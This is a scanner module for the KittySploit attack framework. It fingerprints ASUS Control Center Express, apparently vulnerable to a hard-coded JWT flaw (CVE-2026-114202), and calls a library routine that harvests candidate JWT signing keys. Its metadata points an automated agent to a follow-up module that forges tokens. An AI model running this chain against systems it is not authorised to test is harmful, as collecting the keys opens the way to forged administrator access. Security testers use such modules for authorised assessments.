#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-114202 — ASUS Control Center Express hard-coded JWT."""

from kittysploit import *
from lib.protocols.http.asus_accx import Asus_accx
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client, Asus_accx):
    __info__ = {
        "name": "ASUS ACCX CVE-2026-114202 JWT detect",
        "description": "Fingerprints Control Center Express and harvests JWT key candidates.",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-114202"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-114202"],
        "tags": ["asus", "jwt", "accx", "cve-2026-114202"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/asus_accx_cve_2026_114202_jwt_forge",
                ],
            },
        },
    }

    port = OptPort(8080, "HTTPS management port", required=False)

    def run(self):
        root = self.http_request("GET", "/", timeout=12)
        if not root:
            return False
        srv = (root.headers or {}).get("Server", "")
        if not self.accx_fingerprint(root.text or "", srv):
            return False
        keys = self.accx_harvest_keys()
        self.set_info(
            severity="critical",
            cve="CVE-2026-114202",
            reason="ASUS Control Center Express",
            jwt_key_candidates=len(keys),
        )
        return True